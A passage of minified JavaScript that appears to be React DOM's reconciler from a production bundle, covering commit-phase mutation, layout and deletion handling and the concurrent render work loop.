        $(H, r ? n & 1 | 2 : n & 1),
        t) : (ae(t),
        null);
    case 22:
    case 23:
        return qi(),
        r = t.memoizedState !== null,
        e !== null && e.memoizedState !== null !== r && (t.flags |= 8192),
        r && t.mode & 1 ? ke & 1073741824 && (ae(t),
        t.subtreeFlags & 6 && (t.flags |= 8192)) : ae(t),
        null;
    case 24:
        return null;
    case 25:
        return null
    }
    throw Error(S(156, t.tag))
}
function $f(e, t) {
    switch (zi(t),
    t.tag) {
    case 1:
        return xe(t.type) && il(),
        e = t.flags,
        e & 65536 ? (t.flags = e & -65537 | 128,
        t) : null;
    case 3:
        return xn(),
        V(ye),
        V(de),
        Ai(),
        e = t.flags,
        e & 65536 && !(e & 128) ? (t.flags = e & -65537 | 128,
        t) : null;
    case 5:
        return Di(t),
        null;
    case 13:
        if (V(H),
        e = t.memoizedState,
        e !== null && e.dehydrated !== null) {
            if (t.alternate === null)
                throw Error(S(340));
            vn()
        }
        return e = t.flags,
        e & 65536 ? (t.flags = e & -65537 | 128,
        t) : null;
    case 19:
        return V(H),
        null;
    case 4:
        return xn(),
        null;
    case 10:
        return Mi(t.type._context),
        null;
    case 22:
    case 23:
        return qi(),
        null;
    case 24:
        return null;
    default:
        return null
    }
}
var Or = !1
  , ce = !1
  , Uf = typeof WeakSet == "function" ? WeakSet : Set
  , _ = null;
function on(e, t) {
    var n = e.ref;
    if (n !== null)
        if (typeof n == "function")
            try {
                n(null)
            } catch (r) {
                q(e, t, r)
            }
        else
            n.current = null
}
function Zo(e, t, n) {
    try {
        n()
    } catch (r) {
        q(e, t, r)
    }
}
var eu = !1;
function bf(e, t) {
    if (Oo = nl,
    e = ma(),
    Ei(e)) {
        if ("selectionStart"in e)
            var n = {
                start: e.selectionStart,
                end: e.selectionEnd
            };
        else
            e: {
                n = (n = e.ownerDocument) && n.defaultView || window;
                var r = n.getSelection && n.getSelection();
                if (r && r.rangeCount !== 0) {
                    n = r.anchorNode;
                    var l = r.anchorOffset
                      , o = r.focusNode;
                    r = r.focusOffset;
                    try {
                        n.nodeType,
                        o.nodeType
                    } catch {
                        n = null;
                        break e
                    }
                    var i = 0
                      , s = -1
                      , a = -1
                      , d = 0
                      , h = 0
                      , g = e
                      , m = null;
                    t: for (; ; ) {
                        for (var x; g !== n || l !== 0 && g.nodeType !== 3 || (s = i + l),
                        g !== o || r !== 0 && g.nodeType !== 3 || (a = i + r),
                        g.nodeType === 3 && (i += g.nodeValue.length),
                        (x = g.firstChild) !== null; )
                            m = g,
                            g = x;
                        for (; ; ) {
                            if (g === e)
                                break t;
                            if (m === n && ++d === l && (s = i),
                            m === o && ++h === r && (a = i),
                            (x = g.nextSibling) !== null)
                                break;
                            g = m,
                            m = g.parentNode
                        }
                        g = x
                    }
                    n = s === -1 || a === -1 ? null : {
                        start: s,
                        end: a
                    }
                } else
                    n = null
            }
        n = n || {
            start: 0,
            end: 0
        }
    } else
        n = null;
    for (Do = {
        focusedElem: e,
        selectionRange: n
    },
    nl = !1,
    _ = t; _ !== null; )
        if (t = _,
        e = t.child,
        (t.subtreeFlags & 1028) !== 0 && e !== null)
            e.return = t,
            _ = e;
        else
            for (; _ !== null; ) {
                t = _;
                try {
                    var w = t.alternate;
                    if (t.flags & 1024)
                        switch (t.tag) {
                        case 0:
                        case 11:
                        case 15:
                            break;
                        case 1:
                            if (w !== null) {
                                var v = w.memoizedProps
                                  , N = w.memoizedState
                                  , f = t.stateNode
                                  , c = f.getSnapshotBeforeUpdate(t.elementType === t.type ? v : Oe(t.type, v), N);
                                f.__reactInternalSnapshotBeforeUpdate = c
                            }
                            break;
                        case 3:
                            var p = t.stateNode.containerInfo;
                            p.nodeType === 1 ? p.textContent = "" : p.nodeType === 9 && p.documentElement && p.removeChild(p.documentElement);
                            break;
                        case 5:
                        case 6:
                        case 4:
                        case 17:
                            break;
                        default:
                            throw Error(S(163))
                        }
                } catch (y) {
                    q(t, t.return, y)
                }
                if (e = t.sibling,
                e !== null) {
                    e.return = t.return,
                    _ = e;
                    break
                }
                _ = t.return
            }
    return w = eu,
    eu = !1,
    w
}
function Qn(e, t, n) {
    var r = t.updateQueue;
    if (r = r !== null ? r.lastEffect : null,
    r !== null) {
        var l = r = r.next;
        do {
            if ((l.tag & e) === e) {
                var o = l.destroy;
                l.destroy = void 0,
                o !== void 0 && Zo(t, n, o)
            }
            l = l.next
        } while (l !== r)
    }
}
function Ll(e, t) {
    if (t = t.updateQueue,
    t = t !== null ? t.lastEffect : null,
    t !== null) {
        var n = t = t.next;
        do {
            if ((n.tag & e) === e) {
                var r = n.create;
                n.destroy = r()
            }
            n = n.next
        } while (n !== t)
    }
}
function Jo(e) {
    var t = e.ref;
    if (t !== null) {
        var n = e.stateNode;
        switch (e.tag) {
        case 5:
            e = n;
            break;
        default:
            e = n
        }
        typeof t == "function" ? t(e) : t.current = e
    }
}
function cc(e) {
    var t = e.alternate;
    t !== null && (e.alternate = null,
    cc(t)),
    e.child = null,
    e.deletions = null,
    e.sibling = null,
    e.tag === 5 && (t = e.stateNode,
    t !== null && (delete t[Ve],
    delete t[or],
    delete t[Bo],
    delete t[jf],
    delete t[Cf])),
    e.stateNode = null,
    e.return = null,
    e.dependencies = null,
    e.memoizedProps = null,
    e.memoizedState = null,
    e.pendingProps = null,
    e.stateNode = null,
    e.updateQueue = null
}
function dc(e) {
    return e.tag === 5 || e.tag === 3 || e.tag === 4
}
function tu(e) {
    e: for (; ; ) {
        for (; e.sibling === null; ) {
            if (e.return === null || dc(e.return))
                return null;
            e = e.return
        }
        for (e.sibling.return = e.return,
        e = e.sibling; e.tag !== 5 && e.tag !== 6 && e.tag !== 18; ) {
            if (e.flags & 2 || e.child === null || e.tag === 4)
                continue e;
            e.child.return = e,
            e = e.child
        }
        if (!(e.flags & 2))
            return e.stateNode
    }
}
function ei(e, t, n) {
    var r = e.tag;
    if (r === 5 || r === 6)
        e = e.stateNode,
        t ? n.nodeType === 8 ? n.parentNode.insertBefore(e, t) : n.insertBefore(e, t) : (n.nodeType === 8 ? (t = n.parentNode,
        t.insertBefore(e, n)) : (t = n,
        t.appendChild(e)),
        n = n._reactRootContainer,
        n != null || t.onclick !== null || (t.onclick = ol));
    else if (r !== 4 && (e = e.child,
    e !== null))
        for (ei(e, t, n),
        e = e.sibling; e !== null; )
            ei(e, t, n),
            e = e.sibling
}
function ti(e, t, n) {
    var r = e.tag;
    if (r === 5 || r === 6)
        e = e.stateNode,
        t ? n.insertBefore(e, t) : n.appendChild(e);
    else if (r !== 4 && (e = e.child,
    e !== null))
        for (ti(e, t, n),
        e = e.sibling; e !== null; )
            ti(e, t, n),
            e = e.sibling
}
var le = null
  , De = !1;
function ot(e, t, n) {
    for (n = n.child; n !== null; )
        fc(e, t, n),
        n = n.sibling
}
function fc(e, t, n) {
    if (We && typeof We.onCommitFiberUnmount == "function")
        try {
            We.onCommitFiberUnmount(Sl, n)
        } catch {}
    switch (n.tag) {
    case 5:
        ce || on(n, t);
    case 6:
        var r = le
          , l = De;
        le = null,
        ot(e, t, n),
        le = r,
        De = l,
        le !== null && (De ? (e = le,
        n = n.stateNode,
        e.nodeType === 8 ? e.parentNode.removeChild(n) : e.removeChild(n)) : le.removeChild(n.stateNode));
        break;
    case 18:
        le !== null && (De ? (e = le,
        n = n.stateNode,
        e.nodeType === 8 ? no(e.parentNode, n) : e.nodeType === 1 && no(e, n),
        er(e)) : no(le, n.stateNode));
        break;
    case 4:
        r = le,
        l = De,
        le = n.stateNode.containerInfo,
        De = !0,
        ot(e, t, n),
        le = r,
        De = l;
        break;
    case 0:
    case 11:
    case 14:
    case 15:
        if (!ce && (r = n.updateQueue,
        r !== null && (r = r.lastEffect,
        r !== null))) {
            l = r = r.next;
            do {
                var o = l
                  , i = o.destroy;
                o = o.tag,
                i !== void 0 && (o & 2 || o & 4) && Zo(n, t, i),
                l = l.next
            } while (l !== r)
        }
        ot(e, t, n);
        break;
    case 1:
        if (!ce && (on(n, t),
        r = n.stateNode,
        typeof r.componentWillUnmount == "function"))
            try {
                r.props = n.memoizedProps,
                r.state = n.memoizedState,
                r.componentWillUnmount()
            } catch (s) {
                q(n, t, s)
            }
        ot(e, t, n);
        break;
    case 21:
        ot(e, t, n);
        break;
    case 22:
        n.mode & 1 ? (ce = (r = ce) || n.memoizedState !== null,
        ot(e, t, n),
        ce = r) : ot(e, t, n);
        break;
    default:
        ot(e, t, n)
    }
}
function nu(e) {
    var t = e.updateQueue;
    if (t !== null) {
        e.updateQueue = null;
        var n = e.stateNode;
        n === null && (n = e.stateNode = new Uf),
        t.forEach(function(r) {
            var l = Xf.bind(null, e, r);
            n.has(r) || (n.add(r),
            r.then(l, l))
        })
    }
}
function Ie(e, t) {
    var n = t.deletions;
    if (n !== null)
        for (var r = 0; r < n.length; r++) {
            var l = n[r];
            try {
                var o = e
                  , i = t
                  , s = i;
                e: for (; s !== null; ) {
                    switch (s.tag) {
                    case 5:
                        le = s.stateNode,
                        De = !1;
                        break e;
                    case 3:
                        le = s.stateNode.containerInfo,
                        De = !0;
                        break e;
                    case 4:
                        le = s.stateNode.containerInfo,
                        De = !0;
                        break e
                    }
                    s = s.return
                }
                if (le === null)
                    throw Error(S(160));
                fc(o, i, l),
                le = null,
                De = !1;
                var a = l.alternate;
                a !== null && (a.return = null),
                l.return = null
            } catch (d) {
                q(l, t, d)
            }
        }
    if (t.subtreeFlags & 12854)
        for (t = t.child; t !== null; )
            pc(t, e),
            t = t.sibling
}
function pc(e, t) {
    var n = e.alternate
      , r = e.flags;
    switch (e.tag) {
    case 0:
    case 11:
    case 14:
    case 15:
        if (Ie(t, e),
        Ue(e),
        r & 4) {
            try {
                Qn(3, e, e.return),
                Ll(3, e)
            } catch (v) {
                q(e, e.return, v)
            }
            try {
                Qn(5, e, e.return)
            } catch (v) {
                q(e, e.return, v)
            }
        }
        break;
    case 1:
        Ie(t, e),
        Ue(e),
        r & 512 && n !== null && on(n, n.return);
        break;
    case 5:
        if (Ie(t, e),
        Ue(e),
        r & 512 && n !== null && on(n, n.return),
        e.flags & 32) {
            var l = e.stateNode;
            try {
                Yn(l, "")
            } catch (v) {
                q(e, e.return, v)
            }
        }
        if (r & 4 && (l = e.stateNode,
        l != null)) {
            var o = e.memoizedProps
              , i = n !== null ? n.memoizedProps : o
              , s = e.type
              , a = e.updateQueue;
            if (e.updateQueue = null,
            a !== null)
                try {
                    s === "input" && o.type === "radio" && o.name != null && Ou(l, o),
                    Co(s, i);
                    var d = Co(s, o);
                    for (i = 0; i < a.length; i += 2) {
                        var h = a[i]
                          , g = a[i + 1];
                        h === "style" ? $u(l, g) : h === "dangerouslySetInnerHTML" ? Fu(l, g) : h === "children" ? Yn(l, g) : pi(l, h, g, d)
                    }
                    switch (s) {
                    case "input":
                        wo(l, o);
                        break;
                    case "textarea":
                        Du(l, o);
                        break;
                    case "select":
                        var m = l._wrapperState.wasMultiple;
                        l._wrapperState.wasMultiple = !!o.multiple;
                        var x = o.value;
                        x != null ? un(l, !!o.multiple, x, !1) : m !== !!o.multiple && (o.defaultValue != null ? un(l, !!o.multiple, o.defaultValue, !0) : un(l, !!o.multiple, o.multiple ? [] : "", !1))
                    }
                    l[or] = o
                } catch (v) {
                    q(e, e.return, v)
                }
        }
        break;
    case 6:
        if (Ie(t, e),
        Ue(e),
        r & 4) {
            if (e.stateNode === null)
                throw Error(S(162));
            l = e.stateNode,
            o = e.memoizedProps;
            try {
                l.nodeValue = o
            } catch (v) {
                q(e, e.return, v)
            }
        }
        break;
    case 3:
        if (Ie(t, e),
        Ue(e),
        r & 4 && n !== null && n.memoizedState.isDehydrated)
            try {
                er(t.containerInfo)
            } catch (v) {
                q(e, e.return, v)
            }
        break;
    case 4:
        Ie(t, e),
        Ue(e);
        break;
    case 13:
        Ie(t, e),
        Ue(e),
        l = e.child,
        l.flags & 8192 && (o = l.memoizedState !== null,
        l.stateNode.isHidden = o,
        !o || l.alternate !== null && l.alternate.memoizedState !== null || (Qi = K())),
        r & 4 && nu(e);
        break;
    case 22:
        if (h = n !== null && n.memoizedState !== null,
        e.mode & 1 ? (ce = (d = ce) || h,
        Ie(t, e),
        ce = d) : Ie(t, e),
        Ue(e),
        r & 8192) {
            if (d = e.memoizedState !== null,
            (e.stateNode.isHidden = d) && !h && e.mode & 1)
                for (_ = e,
                h = e.child; h !== null; ) {
                    for (g = _ = h; _ !== null; ) {
                        switch (m = _,
                        x = m.child,
                        m.tag) {
                        case 0:
                        case 11:
                        case 14:
                        case 15:
                            Qn(4, m, m.return);
                            break;
                        case 1:
                            on(m, m.return);
                            var w = m.stateNode;
                            if (typeof w.componentWillUnmount == "function") {
                                r = m,
                                n = m.return;
                                try {
                                    t = r,
                                    w.props = t.memoizedProps,
                                    w.state = t.memoizedState,
                                    w.componentWillUnmount()
                                } catch (v) {
                                    q(r, n, v)
                                }
                            }
                            break;
                        case 5:
                            on(m, m.return);
                            break;
                        case 22:
                            if (m.memoizedState !== null) {
                                lu(g);
                                continue
                            }
                        }
                        x !== null ? (x.return = m,
                        _ = x) : lu(g)
                    }
                    h = h.sibling
                }
            e: for (h = null,
            g = e; ; ) {
                if (g.tag === 5) {
                    if (h === null) {
                        h = g;
                        try {
                            l = g.stateNode,
                            d ? (o = l.style,
                            typeof o.setProperty == "function" ? o.setProperty("display", "none", "important") : o.display = "none") : (s = g.stateNode,
                            a = g.memoizedProps.style,
                            i = a != null && a.hasOwnProperty("display") ? a.display : null,
                            s.style.display = Bu("display", i))
                        } catch (v) {
                            q(e, e.return, v)
                        }
                    }
                } else if (g.tag === 6) {
                    if (h === null)
                        try {
                            g.stateNode.nodeValue = d ? "" : g.memoizedProps
                        } catch (v) {
                            q(e, e.return, v)
                        }
                } else if ((g.tag !== 22 && g.tag !== 23 || g.memoizedState === null || g === e) && g.child !== null) {
                    g.child.return = g,
                    g = g.child;
                    continue
                }
                if (g === e)
                    break e;
                for (; g.sibling === null; ) {
                    if (g.return === null || g.return === e)
                        break e;
                    h === g && (h = null),
                    g = g.return
                }
                h === g && (h = null),
                g.sibling.return = g.return,
                g = g.sibling
            }
        }
        break;
    case 19:
        Ie(t, e),
        Ue(e),
        r & 4 && nu(e);
        break;
    case 21:
        break;
    default:
        Ie(t, e),
        Ue(e)
    }
}
function Ue(e) {
    var t = e.flags;
    if (t & 2) {
        try {
            e: {
                for (var n = e.return; n !== null; ) {
                    if (dc(n)) {
                        var r = n;
                        break e
                    }
                    n = n.return
                }
                throw Error(S(160))
            }
            switch (r.tag) {
            case 5:
                var l = r.stateNode;
                r.flags & 32 && (Yn(l, ""),
                r.flags &= -33);
                var o = tu(e);
                ti(e, o, l);
                break;
            case 3:
            case 4:
                var i = r.stateNode.containerInfo
                  , s = tu(e);
                ei(e, s, i);
                break;
            default:
                throw Error(S(161))
            }
        } catch (a) {
            q(e, e.return, a)
        }
        e.flags &= -3
    }
    t & 4096 && (e.flags &= -4097)
}
function Vf(e, t, n) {
    _ = e,
    mc(e)
}
function mc(e, t, n) {
    for (var r = (e.mode & 1) !== 0; _ !== null; ) {
        var l = _
          , o = l.child;
        if (l.tag === 22 && r) {
            var i = l.memoizedState !== null || Or;
            if (!i) {
                var s = l.alternate
                  , a = s !== null && s.memoizedState !== null || ce;
                s = Or;
                var d = ce;
                if (Or = i,
                (ce = a) && !d)
                    for (_ = l; _ !== null; )
                        i = _,
                        a = i.child,
                        i.tag === 22 && i.memoizedState !== null ? ou(l) : a !== null ? (a.return = i,
                        _ = a) : ou(l);
                for (; o !== null; )
                    _ = o,
                    mc(o),
                    o = o.sibling;
                _ = l,
                Or = s,
                ce = d
            }
            ru(e)
        } else
            l.subtreeFlags & 8772 && o !== null ? (o.return = l,
            _ = o) : ru(e)
    }
}
function ru(e) {
    for (; _ !== null; ) {
        var t = _;
        if (t.flags & 8772) {
            var n = t.alternate;
            try {
                if (t.flags & 8772)
                    switch (t.tag) {
                    case 0:
                    case 11:
                    case 15:
                        ce || Ll(5, t);
                        break;
                    case 1:
                        var r = t.stateNode;
                        if (t.flags & 4 && !ce)
                            if (n === null)
                                r.componentDidMount();
                            else {
                                var l = t.elementType === t.type ? n.memoizedProps : Oe(t.type, n.memoizedProps);
                                r.componentDidUpdate(l, n.memoizedState, r.__reactInternalSnapshotBeforeUpdate)
                            }
                        var o = t.updateQueue;
                        o !== null && Us(t, o, r);
                        break;
                    case 3:
                        var i = t.updateQueue;
                        if (i !== null) {
                            if (n = null,
                            t.child !== null)
                                switch (t.child.tag) {
                                case 5:
                                    n = t.child.stateNode;
                                    break;
                                case 1:
                                    n = t.child.stateNode
                                }
                            Us(t, i, n)
                        }
                        break;
                    case 5:
                        var s = t.stateNode;
                        if (n === null && t.flags & 4) {
                            n = s;
                            var a = t.memoizedProps;
                            switch (t.type) {
                            case "button":
                            case "input":
                            case "select":
                            case "textarea":
                                a.autoFocus && n.focus();
                                break;
                            case "img":
                                a.src && (n.src = a.src)
                            }
                        }
                        break;
                    case 6:
                        break;
                    case 4:
                        break;
                    case 12:
                        break;
                    case 13:
                        if (t.memoizedState === null) {
                            var d = t.alternate;
                            if (d !== null) {
                                var h = d.memoizedState;
                                if (h !== null) {
                                    var g = h.dehydrated;
                                    g !== null && er(g)
                                }
                            }
                        }
                        break;
                    case 19:
                    case 17:
                    case 21:
                    case 22:
                    case 23:
                    case 25:
                        break;
                    default:
                        throw Error(S(163))
                    }
                ce || t.flags & 512 && Jo(t)
            } catch (m) {
                q(t, t.return, m)
            }
        }
        if (t === e) {
            _ = null;
            break
        }
        if (n = t.sibling,
        n !== null) {
            n.return = t.return,
            _ = n;
            break
        }
        _ = t.return
    }
}
function lu(e) {
    for (; _ !== null; ) {
        var t = _;
        if (t === e) {
            _ = null;
            break
        }
        var n = t.sibling;
        if (n !== null) {
            n.return = t.return,
            _ = n;
            break
        }
        _ = t.return
    }
}
function ou(e) {
    for (; _ !== null; ) {
        var t = _;
        try {
            switch (t.tag) {
            case 0:
            case 11:
            case 15:
                var n = t.return;
                try {
                    Ll(4, t)
                } catch (a) {
                    q(t, n, a)
                }
                break;
            case 1:
                var r = t.stateNode;
                if (typeof r.componentDidMount == "function") {
                    var l = t.return;
                    try {
                        r.componentDidMount()
                    } catch (a) {
                        q(t, l, a)
                    }
                }
                var o = t.return;
                try {
                    Jo(t)
                } catch (a) {
                    q(t, o, a)
                }
                break;
            case 5:
                var i = t.return;
                try {
                    Jo(t)
                } catch (a) {
                    q(t, i, a)
                }
            }
        } catch (a) {
            q(t, t.return, a)
        }
        if (t === e) {
            _ = null;
            break
        }
        var s = t.sibling;
        if (s !== null) {
            s.return = t.return,
            _ = s;
            break
        }
        _ = t.return
    }
}
var Wf = Math.ceil
  , gl = rt.ReactCurrentDispatcher
  , Wi = rt.ReactCurrentOwner
  , Le = rt.ReactCurrentBatchConfig
  , O = 0
  , ne = null
  , X = null
  , oe = 0
  , ke = 0
  , sn = Ct(0)
  , J = 0
  , dr = null
  , Ut = 0
  , Tl = 0
  , Hi = 0
  , Gn = null
  , ge = null
  , Qi = 0
  , kn = 1 / 0
  , Ge = null
  , vl = !1
  , ni = null
  , xt = null
  , Dr = !1
  , pt = null
  , yl = 0
  , qn = 0
  , ri = null
  , qr = -1
  , Kr = 0;
function pe() {
    return O & 6 ? K() : qr !== -1 ? qr : qr = K()
}
function wt(e) {
    return e.mode & 1 ? O & 2 && oe !== 0 ? oe & -oe : _f.transition !== null ? (Kr === 0 && (Kr = Zu()),
    Kr) : (e = B,
    e !== 0 || (e = window.event,
    e = e === void 0 ? 16 : oa(e.type)),
    e) : 1
}
function Be(e, t, n, r) {
    if (50 < qn)
        throw qn = 0,
        ri = null,
        Error(S(185));
    pr(e, n, r),
    (!(O & 2) || e !== ne) && (e === ne && (!(O & 2) && (Tl |= n),
    J === 4 && dt(e, oe)),
    we(e, r),
    n === 1 && O === 0 && !(t.mode & 1) && (kn = K() + 500,
    _l && Et()))
}
function we(e, t) {
    var n = e.callbackNode;
    Ed(e, t);
    var r = tl(e, e === ne ? oe : 0);
    if (r === 0)
        n !== null && ms(n),
        e.callbackNode = null,
        e.callbackPriority = 0;
    else if (t = r & -r,
    e.callbackPriority !== t) {
        if (n != null && ms(n),
        t === 1)
            e.tag === 0 ? Ef(iu.bind(null, e)) : ja(iu.bind(null, e)),
            Sf(function() {
                !(O & 6) && Et()
            }),
            n = null;
        else {
            switch (Ju(r)) {
            case 1:
                n = yi;
                break;
            case 4:
                n = Yu;
                break;
            case 16:
                n = el;
                break;
            case 536870912:
                n = Xu;
                break;
            default:
                n = el
            }
            n = Sc(n, hc.bind(null, e))
        }
        e.callbackPriority = t,
        e.callbackNode = n
    }
}
function hc(e, t) {
    if (qr = -1,
    Kr = 0,
    O & 6)
        throw Error(S(327));
    var n = e.callbackNode;
    if (pn() && e.callbackNode !== n)
        return null;
    var r = tl(e, e === ne ? oe : 0);
    if (r === 0)
        return null;
    if (r & 30 || r & e.expiredLanes || t)
        t = xl(e, r);
    else {
        t = r;
        var l = O;
        O |= 2;
        var o = vc();
        (ne !== e || oe !== t) && (Ge = null,
        kn = K() + 500,
        Dt(e, t));
        do
            try {
                Gf();
                break
            } catch (s) {
                gc(e, s)
            }
        while (!0);
        Ti(),
        gl.current = o,
        O = l,
        X !== null ? t = 0 : (ne = null,
        oe = 0,
        t = J)
    }
    if (t !== 0) {
        if (t === 2 && (l = Lo(e),
        l !== 0 && (r = l,
        t = li(e, l))),
        t === 1)
            throw n = dr,
            Dt(e, 0),
            dt(e, r),
            we(e, K()),
            n;
        if (t === 6)
            dt(e, r);
        else {
            if (l = e.current.alternate,
            !(r & 30) && !Hf(l) && (t = xl(e, r),
            t === 2 && (o = Lo(e),
            o !== 0 && (r = o,
            t = li(e, o))),
            t === 1))
                throw n = dr,
                Dt(e, 0),
                dt(e, r),
                we(e, K()),
                n;
            switch (e.finishedWork = l,
            e.finishedLanes = r,
            t) {
            case 0:
            case 1:
                throw Error(S(345));
            case 2:
                Mt(e, ge, Ge);
                break;
            case 3:
                if (dt(e, r),
                (r & 130023424) === r && (t = Qi + 500 - K(),
                10 < t)) {
                    if (tl(e, 0) !== 0)
                        break;
                    if (l = e.suspendedLanes,
                    (l & r) !== r) {
                        pe(),
                        e.pingedLanes |= e.suspendedLanes & l;
                        break
                    }
                    e.timeoutHandle = Fo(Mt.bind(null, e, ge, Ge), t);
                    break
                }
                Mt(e, ge, Ge);
                break;
            case 4:
                if (dt(e, r),
                (r & 4194240) === r)
                    break;
                for (t = e.eventTimes,
                l = -1; 0 < r; ) {
                    var i = 31 - Fe(r);
                    o = 1 << i,
                    i = t[i],
                    i > l && (l = i),
                    r &= ~o
                }
                if (r = l,
                r = K() - r,
                r = (120 > r ? 120 : 480 > r ? 480 : 1080 > r ? 1080 : 1920 > r ? 1920 : 3e3 > r ? 3e3 : 4320 > r ? 4320 : 1960 * Wf(r / 1960)) - r,
                10 < r) {
                    e.timeoutHandle = Fo(Mt.bind(null, e, ge, Ge), r);
                    break
                }
                Mt(e, ge, Ge);
                break;
            case 5:
                Mt(e, ge, Ge);
                break;
            default:
                throw Error(S(329))
            }
        }
    }
    return we(e, K()),
    e.callbackNode === n ? hc.bind(null, e) : null
}
function li(e, t) {
    var n = Gn;
    return e.current.memoizedState.isDehydrated && (Dt(e, t).flags |= 256),
    e = xl(e, t),
    e !== 2 && (t = ge,
    ge = n,
    t !== null && oi(t)),
    e
}
function oi(e) {
    ge === null ? ge = e : ge.push.apply(ge, e)
}
function Hf(e) {
    for (var t = e; ; ) {
        if (t.flags & 16384) {
            var n = t.updateQueue;
            if (n !== null && (n = n.stores,
            n !== null))
                for (var r = 0; r < n.length; r++) {
                    var l = n[r]
                      , o = l.getSnapshot;
                    l = l.value;
                    try {
                        if (!$e(o(), l))
                            return !1
                    } catch {
                        return !1
                    }
                }
        }
        if (n = t.child,
        t.subtreeFlags & 16384 && n !== null)
            n.return = t,
            t = n;
        else {
            if (t === e)
                break;
            for (; t.sibling === null; ) {
                if (t.return === null || t.return === e)
                    return !0;
                t = t.return
            }
            t.sibling.return = t.return,
            t = t.sibling
        }
    }
    return !0
}
function dt(e, t) {
    for (t &= ~Hi,
    t &= ~Tl,
    e.suspendedLanes |= t,
    e.pingedLanes &= ~t,
    e = e.expirationTimes; 0 < t; ) {
        var n = 31 - Fe(t)
          , r = 1 << n;
        e[n] = -1,
        t &= ~r
    }
}
function iu(e) {
    if (O & 6)
        throw Error(S(327));
    pn();
    var t = tl(e, 0);
    if (!(t & 1))
        return we(e, K()),
        null;
    var n = xl(e, t);
    if (e.tag !== 0 && n === 2) {
        var r = Lo(e);
        r !== 0 && (t = r,
        n = li(e, r))
    }
    if (n === 1)
        throw n = dr,
        Dt(e, 0),
        dt(e, t),
        we(e, K()),
        n;
    if (n === 6)
        throw Error(S(345));
    return e.finishedWork = e.current.alternate,
    e.finishedLanes = t,
    Mt(e, ge, Ge),
    we(e, K()),
    null
}
function Gi(e, t) {
    var n = O;
    O |= 1;
    try {
        return e(t)
    } finally {
        O = n,
        O === 0 && (kn = K() + 500,
        _l && Et())
    }
}
function bt(e) {
    pt !== null && pt.tag === 0 && !(O & 6) && pn();
    var t = O;
    O |= 1;
    var n = Le.transition
      , r = B;
    try {
        if (Le.transition = null,
        B = 1,
        e)
            return e()
    } finally {
        B = r,
        Le.transition = n,
        O = t,
        !(O & 6) && Et()
    }
}
function qi() {
    ke = sn.current,
    V(sn)
}
function Dt(e, t) {
    e.finishedWork = null,
    e.finishedLanes = 0;
    var n = e.timeoutHandle;
    if (n !== -1 && (e.timeoutHandle = -1,
    kf(n)),
    X !== null)
        for (n = X.return; n !== null; ) {
            var r = n;
            switch (zi(r),
            r.tag) {
            case 1:
                r = r.type.childContextTypes,
                r != null && il();
                break;
            case 3:
                xn(),
                V(ye),
                V(de),
                Ai();
                break;
            case 5:
                Di(r);
                break;
            case 4:
                xn();
                break;
            case 13:
                V(H);
                break;
            case 19:
                V(H);
                break;
            case 10:
                Mi(r.type._context);
                break;
            case 22:
            case 23:
                qi()
            }
            n = n.return
        }
    if (ne = e,
    X = e = kt(e.current, null),
    oe = ke = t,
    J = 0,
    dr = null,
    Hi = Tl = Ut = 0,
    ge = Gn = null,
    It !== null) {
        for (t = 0; t < It.length; t++)
            if (n = It[t],
            r = n.interleaved,
            r !== null) {
                n.interleaved = null;
                var l = r.next
                  , o = n.pending;
                if (o !== null) {
                    var i = o.next;
                    o.next = l,
                    r.next = i
                }
                n.pending = r
            }
        It = null
    }
    return e
}
function gc(e, t) {
    do {
        var n = X;
        try {
            if (Ti(),
            Hr.current = hl,
            ml) {
                for (var r = Q.memoizedState; r !== null; ) {
                    var l = r.queue;
                    l !== null && (l.pending = null),
                    r = r.next
                }
                ml = !1
            }
            if ($t = 0,
            te = Z = Q = null,
            Hn = !1,
            ur = 0,
            Wi.current = null,
            n === null || n.return === null) {
                J = 1,
                dr = t,
                X = null;
                break
            }
            e: {
                var o = e
                  , i = n.return
                  , s = n
                  , a = t;
                if (t = oe,
                s.flags |= 32768,
                a !== null && typeof a == "object" && typeof a.then == "function") {
                    var d = a
                      , h = s
                      , g = h.tag;
                    if (!(h.mode & 1) && (g === 0 || g === 11 || g === 15)) {
                        var m = h.alternate;
                        m ? (h.updateQueue = m.updateQueue,
                        h.memoizedState = m.memoizedState,
                        h.lanes = m.lanes) : (h.updateQueue = null,
                        h.memoizedState = null)
                    }
                    var x = Gs(i);
                    if (x !== null) {
                        x.flags &= -257,
                        qs(x, i, s, o, t),
                        x.mode & 1 && Qs(o, d, t),
                        t = x,
                        a = d;
                        var w = t.updateQueue;
                        if (w === null) {
                            var v = new Set;
                            v.add(a),
                            t.updateQueue = v
                        } else
                            w.add(a);
                        break e
                    } else {
                        if (!(t & 1)) {
                            Qs(o, d, t),
                            Ki();
                            break e
                        }
                        a = Error(S(426))
                    }
                } else if (W && s.mode & 1) {
                    var N = Gs(i);
                    if (N !== null) {
                        !(N.flags & 65536) && (N.flags |= 256),
                        qs(N, i, s, o, t),
                        Pi(wn(a, s));
                        break e
                    }
                }
                o = a = wn(a, s),
                J !== 4 && (J = 2),
                Gn === null ? Gn = [o] : Gn.push(o),
                o = i;
                do {
                    switch (o.tag) {
                    case 3:
                        o.flags |= 65536,
                        t &= -t,
                        o.lanes |= t;
                        var f = Ja(o, a, t);
                        $s(o, f);
                        break e;
                    case 1:
                        s = a;
                        var c = o.type
                          , p = o.stateNode;
                        if (!(o.flags & 128) && (typeof c.getDerivedStateFromError == "function" || p !== null && typeof p.componentDidCatch == "function" && (xt === null || !xt.has(p)))) {
                            o.flags |= 65536,
                            t &= -t,
                            o.lanes |= t;
                            var y = ec(o, s, t);
                            $s(o, y);
                            break e
                        }
                    }
                    o = o.return
                } while (o !== null)
            }
            xc(n)
        } catch (k) {
            t = k,
            X === n && n !== null && (X = n = n.return);
            continue
        }
        break
    } while (!0)
}
function vc() {
    var e = gl.current;
    return gl.current = hl,
    e === null ? hl : e
}
function Ki() {
    (J === 0 || J === 3 || J === 2) && (J = 4),
    ne === null || !(Ut & 268435455) && !(Tl & 268435455) || dt(ne, oe)
}
function xl(e, t) {
    var n = O;
    O |= 2;
    var r = vc();
    (ne !== e || oe !== t) && (Ge = null,
    Dt(e, t));
    do
        try {
            Qf();
            break
        } catch (l) {
            gc(e, l)
        }
    while (!0);
    if (Ti(),
    O = n,
    gl.current = r,
    X !== null)
        throw Error(S(261));
    return ne = null,
    oe = 0,
    J
}
function Qf() {
    for (; X !== null; )
        yc(X)
}
function Gf() {
    for (; X !== null && !vd(); )
        yc(X)
}
function yc(e) {
    var t = kc(e.alternate, e, ke);
    e.memoizedProps = e.pendingProps,
    t === null ? xc(e) : X = t,
    Wi.current = null
}
